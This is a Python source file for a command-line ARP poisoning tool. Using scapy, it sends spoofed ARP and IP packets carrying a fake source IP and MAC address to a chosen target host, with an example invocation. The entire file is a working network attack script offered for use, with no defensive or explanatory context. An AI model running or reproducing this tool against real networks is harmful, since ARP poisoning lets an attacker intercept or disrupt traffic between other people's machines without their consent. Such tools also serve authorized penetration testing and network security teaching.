#!/usr/bin/python3
#EmreOvunc
#info@emreovunc.com

from argparse import ArgumentParser
from scapy.all import *
import random

def main():
    parser = ArgumentParser()
    parser.add_argument('--target-ip', '-ti', help='target IP address')
    parser.add_argument('--target-mac', '-tm', help='target MAC address')
    parser.add_argument('--fake-ip', '-fi', help='fake IP address -spoofed-')
    parser.add_argument('--fake-mac', '-fm', help='fake MAC address -spoofed-')
    parser.add_argument('--count', '-c', help='number of packets')
    parser.add_argument('--version','-v', action='version', version='ARP_Poisoning_CMD v1.0.1')
    parser.epilog = "Usage: python3 arp_poisoning_cmd.py -ti 10.20.30.40 -tm 11:22:33:aa:bb:cc -fi 10.20.30.41 -fm aa:bb:cc:11:22:33 -c 1"

    args = parser.parse_args()

    if args.target_ip is not None:
        if args.target_mac is not None:
            if args.fake_ip is not None:
                if args.fake_mac is not None:
                    ARP_Packet = ARP()
                    ICMP_Packet = IP()

                    DestinationIP(ARP_Packet, ICMP_Packet, args.target_ip)
                    DestinationHW(ARP_Packet, args.target_mac)
                    SourceIP(ARP_Packet, ICMP_Packet, args.fake_ip)
                    SourceHW(ARP_Packet, args.fake_mac)

                    if args.count is None:
                        print('[!]You did not use --counter/-c parameter, so 1 packet will be sent..')
                        send(ICMP_Packet)
                        send(ARP_Packet)

                    else:
                        for pct in range(int(args.count)):
                            send(ICMP_Packet)
                            send(ARP_Packet)

                else:
                    print('[-]Please, use --fake-mac or -fm to set a fake MAC address!')
                    print('[!]Example: -fm aa:bb:cc:11:22:33')
                    print('[?] -h for help')
                    exit()
            else:
                print('[-]Please, use --fake-ip or -fi to set a fake IP address!')
                print('[!]Example: -fi 10.20.30.40')
                print('[?] -h for help')
                exit()
        else:
            print('[-]Please, use --target-mac or -tm to set a target MAC address!')
            print('[!]Example: -tm aa:bb:cc:11:22:33')
            print('[?] -h for help')
            exit()
    else:
        print('''usage: arp_poisoning_cmd.py [-h] [--target-ip TARGET_IP]
                            [--target-mac TARGET_MAC] [--fake-ip FAKE_IP]
                            [--fake-mac FAKE_MAC] [--count COUNT] [--version]
optional arguments:
  -h, --help            show this help message and exit
  --target-ip TARGET_IP, -ti TARGET_IP
                        target IP address
  --target-mac TARGET_MAC, -tm TARGET_MAC
                        target MAC address
  --fake-ip FAKE_IP, -fi FAKE_IP
                        fake IP address -spoofed-
  --fake-mac FAKE_MAC, -fm FAKE_MAC
                        fake MAC address -spoofed-
  --count COUNT, -c COUNT
                        number of packets
  --version, -v         show program's version number and exit

Usage: python3 arp_poisoning_cmd.py -ti 10.20.30.40 -tm 11:22:33:aa:bb:cc -fi
10.20.30.41 -fm aa:bb:cc:11:22:33 -c 1''')
        exit()


def SourceIP(ARP_Packet, ICMP_Packet, fakeip):
    ARP_Packet.psrc = fakeip
    ICMP_Packet.src = fakeip


def DestinationIP(ARP_Packet, ICMP_Packet, target):
    ARP_Packet.pdst = target
    ICMP_Packet.dst = target


def SourceHW(ARP_Packet, fakemac):
    ARP_Packet.hwsrc = fakemac


def DestinationHW(ARP_Packet, targetmac):
    ARP_Packet.hwdst = targetmac


def randomMAC():
    mac = [random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff),
           random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

main()
